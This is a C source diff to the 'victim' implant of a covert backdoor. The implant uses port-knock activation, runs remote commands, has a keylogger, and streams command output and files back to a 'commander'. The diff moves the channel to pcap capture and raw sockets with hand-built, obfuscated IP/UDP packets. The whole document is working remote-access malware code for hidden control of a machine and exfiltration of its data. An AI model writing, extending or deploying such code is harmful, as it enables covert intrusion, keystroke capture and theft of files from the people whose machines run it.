@@ -39,6 +39,18 @@ static char *format_safe(char *dst, size_t dstlen, const char *fmt, ...) {
     return dst;
 }
 
+static uint16_t ip_checksum(const void *buf, size_t len) {
+    uint32_t sum = 0;
+    const uint16_t *p = (const uint16_t *)buf;
+    while (len > 1) {
+        sum += *p++;
+        len -= 2;
+    }
+    if (len == 1) sum += *(const uint8_t *)p;
+    while (sum >> 16) sum = (sum & 0xFFFFu) + (sum >> 16);
+    return (uint16_t)(~sum & 0xFFFFu);
+}
+
 typedef struct {
     int active;
     int exists;
@@ -90,6 +102,7 @@ static void poll_knock_state_pcap(victim_state_t *state);
 static void poll_session_state(victim_state_t *state);
 static void poll_watch_targets(victim_state_t *state);
 static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 static void reset_knock_state(victim_state_t *state);
 static void maybe_reset_knock_timeout(victim_state_t *state);
 static long elapsed_ms(const struct timeval *start);
@@ -97,9 +110,9 @@ static void activate_session(victim_state_t *state, const struct in_addr *peer_a
 static void deactivate_session(victim_state_t *state, const char *reason);
 static void clear_upload_state(victim_state_t *state);
 static void clear_watch_targets(victim_state_t *state);
-static void handle_covert_packet(victim_state_t *state);
+static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
-static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
+static int send_response_raw(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
 static int wait_for_stream_ack(victim_state_t *state);
 static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet);
 static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
@@ -318,32 +331,9 @@ static void poll_knock_state_pcap(victim_state_t *state) {
 }
 
 static void poll_session_state(victim_state_t *state) {
-    fd_set read_fds;
-    struct timeval timeout;
-    int ready;
-
-    FD_ZERO(&read_fds);
-    FD_SET(state->covert_sock, &read_fds);
-
-    timeout.tv_sec = 1;
-    timeout.tv_usec = 0;
-
-    ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
-    if (ready < 0) {
-        if (errno != EINTR) {
-            perror("select");
-            g_running = 0;
-        }
+    pcap_dispatch(state->pcap_handle, -1, pcap_session_handler, (u_char *)state);
+    if (!state->session_active) {
         return;
-    }
-
-    if (ready > 0 && FD_ISSET(state->covert_sock, &read_fds)) {
-        static int pkt_count = 0;
-        if (pkt_count == 0) {
-            printf("First packet arrived on covert socket (fd=%d)\n", state->covert_sock);
-        }
-        pkt_count++;
-        handle_covert_packet(state);
     }
 }
 
@@ -647,36 +637,43 @@ static long elapsed_ms(const struct timeval *start) {
 }
 
 static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
-    int tos_opt = 1;
+    struct bpf_program filter;
+    char filter_expr[128];
 
     if (state->session_active) {
         deactivate_session(state, "new knock sequence received");
     }
     close_pcap(state);
 
-    state->covert_sock = bind_udp_socket(COVERT_PORT);
-    if (state->covert_sock < 0) {
-        fprintf(stderr, "Unable to bind covert port; session cannot start\n");
-        if (open_pcap(state) != 0) {
-            g_running = 0;
-        }
+    if (open_pcap(state) != 0) {
+        fprintf(stderr, "Unable to reopen capture for session\n");
+        g_running = 0;
         reset_knock_state(state);
         return;
     }
 
-    (void)setsockopt(state->covert_sock, IPPROTO_IP, IP_RECVTOS, &tos_opt, sizeof(tos_opt));
+    pcap_setfilter(state->pcap_handle, NULL);
+
+    snprintf(filter_expr, sizeof(filter_expr), "udp dst port %u", (unsigned)COVERT_PORT);
+    if (pcap_compile(state->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
+        (void)pcap_setfilter(state->pcap_handle, &filter);
+        pcap_freecode(&filter);
+    } else {
+        fprintf(stderr, "Unable to set session pcap filter\n");
+        if (open_pcap(state) != 0) g_running = 0;
+        reset_knock_state(state);
+        return;
+    }
+
+    state->covert_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (state->covert_sock < 0) {
+        fprintf(stderr, "Unable to create raw socket for session\n");
+        if (open_pcap(state) != 0) g_running = 0;
+        reset_knock_state(state);
+        return;
+    }
 
     state->collector_sock = bind_udp_socket(COLLECTOR_PORT);
-    if (state->collector_sock < 0) {
-        close(state->covert_sock);
-        state->covert_sock = -1;
-        fprintf(stderr, "Unable to bind collector port; session cannot start\n");
-        if (open_pcap(state) != 0) {
-            g_running = 0;
-        }
-        reset_knock_state(state);
-        return;
-    }
 
     reset_knock_state(state);
     state->session_active = 1;
@@ -690,8 +687,8 @@ static void activate_session(victim_state_t *state, const struct in_addr *peer_a
     state->peer_addr.sin_port = htons(COVERT_PORT);
 
     inet_ntop(AF_INET, peer_addr, state->peer_ip, sizeof(state->peer_ip));
-    printf("Session opened for %s on UDP port %u (covert_sock=%d, collector_sock=%d)\n",
-           state->peer_ip, (unsigned)COVERT_PORT, state->covert_sock, state->collector_sock);
+    printf("Session opened for %s on UDP port %u (pcap-based)\n",
+           state->peer_ip, (unsigned)COVERT_PORT);
 }
 
 static void deactivate_session(victim_state_t *state, const char *reason) {
@@ -707,6 +704,12 @@ static void deactivate_session(victim_state_t *state, const char *reason) {
     printf("\n");
 
     state->session_active = 0;
+
+    if (state->covert_sock >= 0) {
+        close(state->covert_sock);
+        state->covert_sock = -1;
+    }
+
     memset(&state->allowed_addr, 0, sizeof(state->allowed_addr));
     memset(&state->peer_addr, 0, sizeof(state->peer_addr));
     state->peer_ip[0] = '\0';
@@ -714,7 +717,7 @@ static void deactivate_session(victim_state_t *state, const char *reason) {
     state->next_seq = SEQ_INIT;
     reset_knock_state(state);
 
-    close_session_sockets(state);
+    close_pcap(state);
 
     if (open_pcap(state) != 0) {
         fprintf(stderr, "Unable to reopen capture; victim will exit\n");
@@ -741,115 +744,115 @@ static void clear_watch_targets(victim_state_t *state) {
     memset(&state->directory_watch, 0, sizeof(state->directory_watch));
 }
 
-static void handle_covert_packet(victim_state_t *state) {
-    uint8_t packet[PACKET_SIZE_MAX];
-    struct sockaddr_in src_addr;
-    struct iovec iov;
-    struct msghdr msg;
-    uint8_t ctrl_buf[256];
-    struct cmsghdr *cmsg;
-    socklen_t src_len = sizeof(src_addr);
-    ssize_t received;
+static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
+    victim_state_t *state = (victim_state_t *)args;
+    const u_char *ip_hdr;
+    uint16_t ether_type;
+    int ip_header_len;
+    uint16_t dst_port;
+    struct in_addr src_addr;
+    uint16_t src_port;
+    int datalink;
+    char src_ip[INET_ADDRSTRLEN];
+    const u_char *udp_payload;
+    size_t udp_payload_len;
+    struct sockaddr_in peer_addr;
+    uint8_t pkt_buf[PACKET_SIZE_MAX];
     parsed_packet_t parsed;
     char error[RESPONSE_TEXT_MAX];
-    char src_ip[INET_ADDRSTRLEN];
-    uint8_t received_tos = 0;
-    int tos_found = 0;
 
-    iov.iov_base = packet;
-    iov.iov_len = sizeof(packet);
+    (void)header;
 
-    memset(&msg, 0, sizeof(msg));
-    msg.msg_name = &src_addr;
-    msg.msg_namelen = src_len;
-    msg.msg_iov = &iov;
-    msg.msg_iovlen = 1;
-    msg.msg_control = ctrl_buf;
-    msg.msg_controllen = sizeof(ctrl_buf);
+    datalink = pcap_datalink(state->pcap_handle);
 
-    received = recvmsg(state->covert_sock, &msg, 0);
-
-    if (received < 0) {
-        if (errno != EINTR) {
-            perror("recvmsg covert");
-        }
+    if (datalink == DLT_LINUX_SLL) {
+        uint16_t proto; memcpy(&proto, packet + 14, 2);
+        if (ntohs(proto) != 0x0800) return;
+        ip_hdr = packet + 16;
+    } else if (datalink == DLT_NULL) {
+        uint32_t family; memcpy(&family, packet, 4);
+        if (family != 2) return;
+        ip_hdr = packet + 4;
+    } else if (datalink == DLT_EN10MB) {
+        memcpy(&ether_type, packet + 12, 2);
+        if (ntohs(ether_type) != 0x0800) return;
+        ip_hdr = packet + 14;
+    } else if (datalink == DLT_RAW) {
+        ip_hdr = packet;
+    } else {
         return;
     }
 
-    for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
-#ifdef IP_RECVTOS
-        if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_RECVTOS) {
-            if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
-                received_tos = *(uint8_t *)CMSG_DATA(cmsg);
-                tos_found = 1;
-            }
-        }
-#endif
-        if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_TOS) {
-            if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
-                received_tos = *(uint8_t *)CMSG_DATA(cmsg);
-                tos_found = 1;
-            }
+    if ((ip_hdr[0] & 0xF0) != 0x40) return;
+    if (ip_hdr[9] != 17) return;
+
+    ip_header_len = (ip_hdr[0] & 0x0F) * 4;
+    memcpy(&src_addr, ip_hdr + 12, 4);
+
+    {
+        const u_char *udp_hdr = ip_hdr + ip_header_len;
+        memcpy(&src_port, udp_hdr, 2);
+        memcpy(&dst_port, udp_hdr + 2, 2);
+        dst_port = ntohs(dst_port);
+
+        uint16_t udp_len;
+        memcpy(&udp_len, udp_hdr + 4, 2);
+        udp_len = ntohs(udp_len);
+
+        if (dst_port != COVERT_PORT) return;
+
+        udp_payload = udp_hdr + 8;
+        udp_payload_len = (size_t)(udp_len - 8);
+        if (udp_payload_len > sizeof(pkt_buf)) udp_payload_len = sizeof(pkt_buf);
+        if (udp_payload_len < sizeof(covert_header_t) + CHECKSUM_SIZE) return;
+        memcpy(pkt_buf, udp_payload, udp_payload_len);
+
+        if (protocol_parse_packet(pkt_buf, udp_payload_len, &parsed, error, sizeof(error)) != 0) {
+            fprintf(stderr, "Invalid packet: %s\n", error);
+            return;
         }
     }
 
-    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
+    inet_ntop(AF_INET, &src_addr, src_ip, sizeof(src_ip));
 
     if (!state->session_active) {
-        printf("Ignoring covert packet from %s without an active session\n", src_ip);
+        (void)src_port;
         return;
     }
 
-    if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr) {
-        printf("Ignoring covert packet from unauthorized peer %s\n", src_ip);
+    if (src_addr.s_addr != state->allowed_addr.s_addr) {
+        (void)src_port;
         return;
     }
 
-    state->peer_addr = src_addr;
-
-    if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
-        fprintf(stderr, "Invalid packet from %s: %s\n", src_ip, error);
-        (void)send_response(state, &src_addr, CMD_ERROR, error);
-        return;
-    }
-
-    if (tos_found) {
-        uint32_t tos_key;
-        uint8_t expected_tos;
-        tos_key = protocol_derive_obfuscation_key(SEQ_INIT);
-        expected_tos = (uint8_t)(((tos_key >> 24) ^ parsed.command ^ (uint8_t)parsed.seq_num) & 0xFC);
-        if ((received_tos & 0xFC) != expected_tos) {
-            printf("Covert IP TOS field mismatch: got 0x%02x, expected 0x%02x (platform may not preserve TOS)\n",
-                    (unsigned)received_tos, (unsigned)expected_tos);
-        }
-    }
+    memset(&peer_addr, 0, sizeof(peer_addr));
+    peer_addr.sin_family = AF_INET;
+    peer_addr.sin_addr = src_addr;
+    peer_addr.sin_port = htons(COVERT_PORT);
+    state->peer_addr = peer_addr;
 
     if (parsed.seq_num < state->expected_seq) {
-        printf("Ignoring stale command sequence 0x%08x (expected 0x%08x)\n",
-               parsed.seq_num,
-               state->expected_seq);
+        (void)src_port;
         return;
     }
 
     if (parsed.seq_num != state->expected_seq) {
-        fprintf(stderr, "Command sequence mismatch: received 0x%08x, expected 0x%08x\n",
-                parsed.seq_num,
-                state->expected_seq);
-        (void)send_response(state, &src_addr, CMD_ERROR, "sequence mismatch");
+        (void)send_response_raw(state, &peer_addr, CMD_ERROR, (const uint8_t *)"sequence mismatch", 17);
+        (void)src_port;
         return;
     }
 
     state->expected_seq++;
 
-    printf("Command %s (0x%02x) received from %s (TOS 0x%02x)\n",
+    printf("Command %s (0x%02x) received from %s\n",
            protocol_command_name(parsed.command),
            parsed.command,
-           src_ip,
-           (unsigned)received_tos);
+           src_ip);
 
-    if (process_command(state, &src_addr, &parsed) != 0) {
+    if (process_command(state, &peer_addr, &parsed) != 0) {
         fprintf(stderr, "Command %s failed\n", protocol_command_name(parsed.command));
     }
+    (void)src_port;
 }
 
 static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message) {
@@ -863,17 +866,34 @@ static int send_response(victim_state_t *state, const struct sockaddr_in *peer_a
         payload_len = (uint16_t)message_len;
     }
 
-    return send_response_payload(state, peer_addr, command, (const uint8_t *)message, payload_len);
+    return send_response_raw(state, peer_addr, command, (const uint8_t *)message, payload_len);
 }
 
-static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
-    uint8_t packet[PACKET_SIZE_MAX];
-    size_t packet_len;
-    ssize_t sent;
-    char error[128];
-    uint8_t tos_val;
-    uint32_t tos_key;
+static int send_response_raw(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
+    uint8_t raw_packet[PACKET_SIZE_MAX + sizeof(struct ip) + 64];
+    struct ip *ip_data;
+    size_t total_len;
+    uint16_t udp_payload_len;
+    uint8_t obfuscated[PROTOCOL_PACKET_PAYLOAD_MAX];
+    uint32_t obfuscation_key;
+    uint16_t src_port_val;
+    int enabled;
     uint32_t seq_to_send;
+
+    struct {
+        uint16_t src_port;
+        uint16_t dst_port;
+        uint16_t length;
+        uint16_t checksum;
+    } udp_hdr;
+
+    struct {
+        uint32_t src;
+        uint32_t dst;
+        uint8_t zero;
+        uint8_t proto;
+        uint16_t len;
+    } pseudo;
 
     if (payload_len > PROTOCOL_PACKET_PAYLOAD_MAX) {
         payload_len = (uint16_t)EXEC_OUTPUT_CHUNK_MAX;
@@ -881,156 +901,103 @@ static int send_response_payload(victim_state_t *state, const struct sockaddr_in
 
     seq_to_send = state->next_seq++;
 
-    packet_len = protocol_build_packet(
-        seq_to_send,
-        command,
-        payload,
-        payload_len,
-        packet,
-        sizeof(packet),
-        error,
-        sizeof(error)
-    );
-    if (packet_len == 0) {
-        fprintf(stderr, "Unable to build response packet: %s\n", error);
-        return -1;
+    memcpy(obfuscated, payload, payload_len);
+    obfuscation_key = protocol_derive_obfuscation_key(SEQ_INIT);
+    protocol_obfuscate_payload(obfuscated, payload_len, obfuscation_key);
+
+    covert_header_t header;
+    uint16_t checksum;
+    header.seq_num = htonl(seq_to_send);
+    header.command = command;
+    header.payload_len = htons(payload_len);
+    {
+        uint8_t proto_buf[PACKET_SIZE_MAX];
+        memcpy(proto_buf, &header, sizeof(header));
+        if (payload_len > 0) memcpy(proto_buf + sizeof(header), obfuscated, payload_len);
+        checksum = htons(protocol_compute_checksum(proto_buf, sizeof(header) + payload_len));
     }
 
-    tos_key = protocol_derive_obfuscation_key(SEQ_INIT);
-    tos_val = (uint8_t)(((tos_key >> 24) ^ command ^ (uint8_t)seq_to_send) & 0xFC);
-    (void)setsockopt(state->covert_sock, IPPROTO_IP, IP_TOS, &tos_val, sizeof(tos_val));
+    src_port_val = htons((uint16_t)(seq_to_send & 0xFFFFu));
 
-    sent = sendto(
-        state->covert_sock,
-        packet,
-        packet_len,
-        0,
-        (const struct sockaddr *)peer_addr,
-        sizeof(*peer_addr)
-    );
+    udp_payload_len = (uint16_t)(sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE);
+    memset(&udp_hdr, 0, sizeof(udp_hdr));
+    udp_hdr.src_port = src_port_val;
+    udp_hdr.dst_port = htons(COVERT_PORT);
+    udp_hdr.length    = htons((uint16_t)(sizeof(udp_hdr) + udp_payload_len));
+    udp_hdr.checksum  = 0;
 
-    if (sent != (ssize_t)packet_len) {
-        perror("sendto response");
-        return -1;
+    total_len = sizeof(struct ip) + sizeof(udp_hdr) + udp_payload_len;
+
+    memset(raw_packet, 0, sizeof(raw_packet));
+    ip_data = (struct ip *)raw_packet;
+    ip_data->ip_v   = 4;
+    ip_data->ip_hl  = 5;
+    ip_data->ip_tos = 0;
+    ip_data->ip_id  = htons((uint16_t)((OBFUSCATION_KEY_BASE >> 16) & 0xFFFFu));
+    ip_data->ip_off = 0;
+    ip_data->ip_ttl = 64;
+    ip_data->ip_p   = IPPROTO_UDP;
+    ip_data->ip_src.s_addr = htonl(INADDR_ANY);
+    ip_data->ip_dst = peer_addr->sin_addr;
+#ifdef __APPLE__
+    ip_data->ip_len = (uint16_t)total_len;
+#else
+    ip_data->ip_len = htons((uint16_t)total_len);
+#endif
+    ip_data->ip_sum = 0;
+    ip_data->ip_sum = ip_checksum(ip_data, sizeof(struct ip));
+
+    memset(&pseudo, 0, sizeof(pseudo));
+    pseudo.src = ip_data->ip_src.s_addr;
+    pseudo.dst = ip_data->ip_dst.s_addr;
+    pseudo.zero = 0;
+    pseudo.proto = IPPROTO_UDP;
+    pseudo.len = htons((uint16_t)(sizeof(udp_hdr) + udp_payload_len));
+    {
+        uint8_t pseudo_buf[sizeof(pseudo) + sizeof(udp_hdr) + udp_payload_len];
+        memcpy(pseudo_buf, &pseudo, sizeof(pseudo));
+        memcpy(pseudo_buf + sizeof(pseudo), &udp_hdr, sizeof(udp_hdr));
+        memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr), &header, sizeof(header));
+        if (payload_len > 0) memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr) + sizeof(header), obfuscated, payload_len);
+        memcpy(pseudo_buf + sizeof(pseudo) + sizeof(udp_hdr) + sizeof(header) + payload_len, &checksum, CHECKSUM_SIZE);
+        udp_hdr.checksum = ip_checksum(pseudo_buf, sizeof(pseudo_buf));
     }
 
+    memcpy(raw_packet + sizeof(struct ip), &udp_hdr, sizeof(udp_hdr));
+    memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr), &header, sizeof(header));
+    if (payload_len > 0) memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr) + sizeof(header), obfuscated, payload_len);
+    memcpy(raw_packet + sizeof(struct ip) + sizeof(udp_hdr) + sizeof(header) + payload_len, &checksum, CHECKSUM_SIZE);
+
+    enabled = 1;
+    setsockopt(state->covert_sock, IPPROTO_IP, IP_HDRINCL, &enabled, sizeof(enabled));
+
+    if (sendto(state->covert_sock, raw_packet, total_len, 0,
+               (const struct sockaddr *)peer_addr, sizeof(*peer_addr)) < 0) {
+        perror("sendto response raw");
+        return -1;
+    }
     return 0;
 }
 
 static int wait_for_stream_ack(victim_state_t *state) {
-    uint8_t packet[PACKET_SIZE_MAX];
-    parsed_packet_t parsed;
-    struct sockaddr_in src_addr;
-    socklen_t src_len = sizeof(src_addr);
-    fd_set read_fds;
-    struct timeval timeout;
-    char error[RESPONSE_TEXT_MAX];
+    struct timeval start;
+    gettimeofday(&start, NULL);
 
     while (1) {
-        int ready;
+        struct timeval now;
+        long elapsed;
 
-        FD_ZERO(&read_fds);
-        FD_SET(state->covert_sock, &read_fds);
-        timeout.tv_sec = RESPONSE_TIMEOUT_MS / 1000;
-        timeout.tv_usec = (RESPONSE_TIMEOUT_MS % 1000) * 1000;
+        pcap_dispatch(state->pcap_handle, -1, pcap_session_handler, (u_char *)state);
 
-        ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
-        if (ready < 0) {
-            if (errno == EINTR) {
-                continue;
-            }
-            perror("select stream ack");
+        if (!state->session_active) {
             return -1;
         }
 
-        if (ready == 0) {
+        gettimeofday(&now, NULL);
+        elapsed = (now.tv_sec - start.tv_sec) * 1000L + (now.tv_usec - start.tv_usec) / 1000L;
+        if (elapsed >= (long)RESPONSE_TIMEOUT_MS) {
             fprintf(stderr, "Timed out waiting for commander ACK\n");
             return -1;
-        }
-
-        {
-            struct iovec iov;
-            struct msghdr msg;
-            uint8_t ctrl_buf[256];
-            struct cmsghdr *cmsg;
-            ssize_t received;
-            uint8_t received_tos = 0;
-            int tos_found = 0;
-
-            iov.iov_base = packet;
-            iov.iov_len = sizeof(packet);
-
-            memset(&msg, 0, sizeof(msg));
-            msg.msg_name = &src_addr;
-            msg.msg_namelen = src_len;
-            msg.msg_iov = &iov;
-            msg.msg_iovlen = 1;
-            msg.msg_control = ctrl_buf;
-            msg.msg_controllen = sizeof(ctrl_buf);
-
-            received = recvmsg(state->covert_sock, &msg, 0);
-
-            if (received < 0) {
-                if (errno == EINTR) {
-                    continue;
-                }
-                perror("recvmsg stream ack");
-                return -1;
-            }
-
-            for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
-    #ifdef IP_RECVTOS
-                if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_RECVTOS) {
-                    if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
-                        received_tos = *(uint8_t *)CMSG_DATA(cmsg);
-                        tos_found = 1;
-                    }
-                }
-    #endif
-                if (cmsg->cmsg_level == IPPROTO_IP && cmsg->cmsg_type == IP_TOS) {
-                    if (cmsg->cmsg_len >= CMSG_LEN(sizeof(uint8_t))) {
-                        received_tos = *(uint8_t *)CMSG_DATA(cmsg);
-                        tos_found = 1;
-                    }
-                }
-            }
-
-            if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr ||
-                src_addr.sin_port != state->peer_addr.sin_port) {
-                continue;
-            }
-
-            if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
-                fprintf(stderr, "Invalid stream ACK: %s\n", error);
-                return -1;
-            }
-
-            if (tos_found && parsed.command == CMD_ACK) {
-                uint32_t tos_key;
-                uint8_t expected_tos;
-                tos_key = protocol_derive_obfuscation_key(SEQ_INIT);
-                expected_tos = (uint8_t)(((tos_key >> 24) ^ parsed.command ^ (uint8_t)parsed.seq_num) & 0xFC);
-                if ((received_tos & 0xFC) != expected_tos) {
-                    fprintf(stderr, "Stream ACK TOS mismatch: got 0x%02x, expected 0x%02x\n",
-                            (unsigned)received_tos, (unsigned)expected_tos);
-                    continue;
-                }
-            }
-
-            if (parsed.seq_num < state->expected_seq) {
-                continue;
-            }
-
-            if (parsed.seq_num != state->expected_seq || parsed.command != CMD_ACK) {
-                fprintf(stderr, "Unexpected stream ACK packet: %s seq=0x%08x expected=0x%08x\n",
-                        protocol_command_name(parsed.command),
-                        parsed.seq_num,
-                        state->expected_seq);
-                return -1;
-            }
-
-            state->expected_seq++;
-            return 0;
         }
     }
 }
@@ -1224,7 +1191,7 @@ static int execute_command(victim_state_t *state, const struct sockaddr_in *peer
 
         if (n > 0) {
             sent_output = 1;
-            if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
+            if (send_response_raw(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
                 read_error = 1;
             } else if (wait_for_stream_ack(state) != 0) {
                 read_error = 1;
@@ -1258,7 +1225,7 @@ static int execute_command(victim_state_t *state, const struct sockaddr_in *peer
 
     if (!sent_output) {
         static const char no_output[] = "(no output)\n";
-        if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, (const uint8_t *)no_output, (uint16_t)(sizeof(no_output) - 1)) != 0) {
+        if (send_response_raw(state, peer_addr, CMD_EXEC_OUTPUT, (const uint8_t *)no_output, (uint16_t)(sizeof(no_output) - 1)) != 0) {
             snprintf(message, message_len, "command failed while sending output");
             return -1;
         }
@@ -1297,7 +1264,7 @@ static int send_file_to_commander(victim_state_t *state, const struct sockaddr_i
     }
 
     while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
-        if (send_response_payload(state, peer_addr, CMD_FILE_DATA, buffer, (uint16_t)bytes_read) != 0) {
+        if (send_response_raw(state, peer_addr, CMD_FILE_DATA, buffer, (uint16_t)bytes_read) != 0) {
             failed = 1;
             break;
         }
